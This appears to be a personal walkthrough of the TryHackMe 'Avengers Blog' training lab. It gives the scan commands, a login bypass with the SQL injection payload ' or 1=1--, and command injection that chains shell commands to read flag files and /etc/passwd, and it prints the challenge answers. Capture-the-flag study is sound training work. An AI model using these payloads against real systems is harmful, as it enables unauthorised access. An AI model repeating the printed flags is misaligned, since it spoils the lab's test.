---
Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection.
---

![](https://i.imgur.com/V9AE3D0.png)

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/526fb97c8ede3330397e5cee20a8db6a.png)

###  Deploy 

![](https://i.imgur.com/tnuaYCG.png)

Connect to our network and deploy the Avengers Blog machine 

This machine may take 5-10 minutes to load fully.



Connect to our network by going to your access page. This is important as you will not be able to access the machine without connecting!


Deploy the machine by clicking the green "Deploy" button on this task and access its webserver.


### Cookies 

![](https://i.imgur.com/nxx1oX9.png)

HTTP Cookies is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing. They're intended to remember things such as your login information, items in your shopping cart or language you prefer.

Advertisers can use also tracking cookies to identify which sites you've previously visited or where about's on a web-page you've clicked. Some tracking cookies have become so intrusive, many anti-virus programs classify them as spyware.

You can view & dynamically update your cookies directly in your browser. To do this, press F12 (or right click and select Inspect) to open the developer tools on your browser, then click Application and then Cookies. 


```
view-source:http://10.10.252.163/js/script.js

document.cookie = "flag1=cookie_secrets; expires=Thu, 18 Dec 2050 12:00:00 UTC";

```

On the deployed Avengers machine you recently deployed, get the flag1 cookie value.
*cookie_secrets*

or just go to inspect and choose cookies

![[Pasted image 20221003144903.png]]

### HTTP Headers 

HTTP Headers let a client and server pass information with a HTTP request or response. Header names and values are separated by a single colon and are integral part of the HTTP protocol.

![](https://i.imgur.com/GlCdRIM.png)

The main two HTTP Methods are POST and GET requests. The GET method us used to request data from a resource and the POST method is used to send data to a server.

We can view requests made to and from our browser by opening the Developer Tools again and navigating to the Network tab. Have this tab open and refresh the page to see all requests made. You will be able to see the original request made from your browser to the web server. 


![[Pasted image 20221003145328.png]]

Look at the HTTP response headers and obtain flag 2.
*headers_are_important*

###  Enumeration and FTP 

![](https://i.imgur.com/d5WDCfb.png)
In this task we will scan the machine with nmap (a network scanner) and access the FTP service using reusable credentials.

Lets get started by scanning the machine, you will need nmap. If you don't have the application installed you can use our web-based AttackBox that has nmap pre-installed.

In your terminal, execute the following command:
nmap <machine_ip> -v

 This will scan the machine and determine what services on which ports are running. For this machine, you will see the following ports open:

![](https://i.imgur.com/UjXizy4.png)

Port 80 has a HTTP web server running on
Port 22 is to SSH into the machine
Port 21 is used for FTP (file transfer)

We've accessed the web server, lets now access the FTP service. If you read the Avengers web page, you will see that Rocket made a post asking for Groot's password to be reset, the post included his old password too!

In your terminal, execute the following command:
ftp <machine_ip>

We will be asked for a username (groot) and a password (iamgroot). We should have now successfully logged into the FTP share using Groots credentials!

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC 10.10.252.163
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 15:59 EDT
Nmap scan report for 10.10.252.163
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   2048 83:98:6b:eb:bc:97:3a:26:88:4e:49:a6:56:8f:4e:13 (RSA)
|   256 7b:fe:cc:aa:d9:84:bc:dd:dc:df:24:2b:47:dc:d0:5e (ECDSA)
|_  256 03:90:33:53:97:86:70:f1:65:6c:62:14:1f:29:fa:2f (ED25519)
80/tcp open  http
|_http-title: Avengers! Assemble!

Nmap done: 1 IP address (1 host up) scanned in 11.26 seconds
zsh: segmentation fault  sudo nmap -sC 10.10.252.163

┌──(kali㉿kali)-[~]
└─$ ftp 10.10.252.163         
Connected to 10.10.252.163.
220 (vsFTPd 3.0.3)
Name (10.10.252.163:kali): anonymous
530 Permission denied.
ftp: Login failed
ftp> groot
?Invalid command.
ftp> exit
221 Goodbye.
                                                                          
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.252.163
Connected to 10.10.252.163.
220 (vsFTPd 3.0.3)
Name (10.10.252.163:kali): groot
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48359|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42657|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
ftp> more flag3.txt
8fc651a739befc58d450dc48e1f1fd2e

```

Look around the FTP share and read flag 3!
You might have to enter passive mode when accessing the FTP share.
*8fc651a739befc58d450dc48e1f1fd2e*

### GoBuster 

![|333](https://i.imgur.com/gODlTeh.png)

Lets use a fast directory discovery tool called GoBuster. This program will locate a directory that you can use to login to Mr. Starks Tarvis portal!

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

You can either download GoBuster, or use the Kali Linux machine that has it pre-installed.

Lets run GoBuster with a wordlist (on Kali they're located under /usr/share/wordlists):
gobuster dir -u http://<machine_ip> -w <word_list_location>


```
                                                                          
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.252.163 -w /usr/share/wordlists/dirb/common.txt -t 60
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.163
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/03 16:04:22 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Home                 (Status: 302) [Size: 23] [--> /]        
/home                 (Status: 302) [Size: 23] [--> /]        
/img                  (Status: 301) [Size: 173] [--> /img/]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/logout               (Status: 302) [Size: 29] [--> /portal]  
/portal               (Status: 200) [Size: 1409]  
```

What is the directory that has an Avengers login?
*/portal*

### SQL Injection 

![](https://i.imgur.com/wTsQFw0.png)

You should now see the following page above. We're going to manually exploit this page using an attack called SQL injection.

SQL Injection is a code injection technique that manipulates an SQL query. You can execute you're own SQL that could destroy the database, reveal all database data (such as usernames and passwords) or trick the web server in authenticating you.

To exploit SQL, we first need to know how it works. A SQL query could be 

	SELECT * FROM Users WHERE username = {User Input} AND password = {User Input 2} , if you insert additional SQL as the {User Input} we can manipulate this query. For example, if I have the {User Input 2} as ' 1=1 we could trick the query into authenticating us as the ' character would break the SQL query and 1=1 would evaluate to be true.

	To conclude, having our first {User Input} as the username of the account and {User Input 2} being the condition to make the query true, the final query would be:
	SELECT * FROM Users WHERE username = `admin` AND password = `' 1=1`

This would authenticate us as the admin user.

```
  <label for="inputEmail" class="sr-only">Username</label>
      <input type="text" id="inputEmail" name="username" class="form-control" placeholder="Username" required autofocus>
      <label for="inputPassword" class="sr-only">Password</label>
      <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
      <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
      <!-- Remember to sanitize username and password to stop SQLi -->
      <p class="mt-5 mb-3 text-muted">&copy; Avengers 2012 - 2019</p>


so as username

' or 1=1--

pass 

' or 1=1--

looking view-source:http://10.10.252.163/home

223 lines
```

Log into the Avengers site. View the page source, how many lines of code are there?
Have the username and password as ' or 1=1-- (include the apostrophe).

*223*

### Remote Code Execution and Linux 

![[Pasted image 20221003151412.png]]



You should be logged into the Jarvis access panel! Here we can execute commands on the machine.. I wonder if we can exploit this to read files on the system.

Try executing the ls command to list all files in the current directory. Now try joining 2 Linux commands together to list files in the parent directory: cd ../; ls doing so will show a file called flag5.txt, we can add another command to read this file: cd ../; ls; cat flag5.txt

But oh-no! The cat command is disallowed! We will have to think of another Linux command we can use to read it! 

```
cd ..; ls; tac flag5.txt

Command results

avengers
flag5.txt
d335e2d13f36558ba1e67969a1718af7


tac /etc/passwd

groot:x:1001:1001:,,,:/home/groot:/bin/bash
ftp:x:112:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sys:x:3:3:sys:/dev:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash

tac /etc/shadow
Command disallowed


   <script>
      async function runCommand(commandStr) {
        return new Promise(async function(resolve, reject) {
        /*  $.getJSON("/command/" + command, function(result){
            return resolve(result)
          })*/
        

		$.post('/command', { command: commandStr }, async function(response) {
        	  return resolve(response)
		})
	})
      
      }

      document.getElementById("command").addEventListener("keyup", async function(event) {
        if (event.keyCode === 13) {
          event.preventDefault();
          const data = await runCommand(event.target.value)
          document.querySelector('#command-results').innerHTML = "<h4>Command results</h4></br>" + data
          document.querySelector('#command-results').style.display = 'block'
        }
      });

      const particlesJSON = {
      "particles": {
              "number": {
                  "value": 50,
                  "density": {
                      "enable": true,
                      "value_area": 700 //Denser the smaller the number.
                  }
              },
              "color": { //The color for every node, not the connecting lines.
                  "value": "#01579b" //Or use an array of colors like ["#9b0000", "#001378", "#0b521f"]
              },
              "shape": {
                  "type": "circle", // Can show circle, edge (a square), triangle, polygon, star, img, or an array of multiple.
                  "stroke": { //The border
                      "width": 1,
                      "color": "#145ea8"
                  },
                  "polygon": { //if the shape is a polygon
                      "nb_sides": 5
                  }
              },
              "opacity": {
                  "value": 0.7,
                  "random": true
              },
              "size": {
                  "value": 5,
                  "random": true
              },
              "line_linked": {
                  "enable": true,
                  "distance": 200, //The radius before a line is added, the lower the number the more lines.
                  "color": "#007ecc",
                  "opacity": 0.5,
                  "width": 2
              },
              "move": {
                  "enable": true,
                  "speed": 2,
                  "direction": "top", //Move them off the canvas, either "none", "top", "right", "bottom", "left", "top-right", "bottom-right" et cetera...
                  "random": true,
                  "straight": false, //Whether they'll shift left and right while moving.
                  "out_mode": "out", //What it'll do when it reaches the end of the canvas, either "out" or "bounce".
                  "bounce": false,
                  "attract": { //Make them start to clump together while moving.
                      "enable": true,
                      "rotateX": 600,
                      "rotateY": 1200
                  }
              }
          },
        //Negate the default interactivity
        "interactivity": {
              "detect_on": "canvas",
              "events": {
                  "onhover": {
                      "enable": false,
                      "mode": "repulse"
                  },
                  "onclick": {
                      "enable": false,
                      "mode": "push"
                  },
                  "resize": true
              },
              "modes": {
                  "grab": {
                      "distance": 800,
                      "line_linked": {
                          "opacity": 1
                      }
                  },
                  "bubble": {
                      "distance": 800,
                      "size": 80,
                      "duration": 2,
                      "opacity": 0.8,
                      "speed": 3
                  },
                  "repulse": {
                      "distance": 400,
                      "duration": 0.4
                  },
                  "push": {
                      "particles_nb": 4
                  },
                  "remove": {
                      "particles_nb": 2
                  }
              }
          },
          "retina_detect": true
      }

      particlesJS("particles-js", particlesJSON)
</script>


┌──(kali㉿kali)-[~]
└─$ cat pass.txt | r
cat pass.txt
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
                                                                          
┌──(kali㉿kali)-[~]
└─$ tac pass.txt     
07011972
orlando12
carp4ever
scoobydoo2
skyler22
apples01
bilbo101
mailcall

```

![[Pasted image 20221003152128.png]]

Read the contents of flag5.txt
What Linux command can read a file content in reverse?
*d335e2d13f36558ba1e67969a1718af7*


[[Linux Local Enumeration]]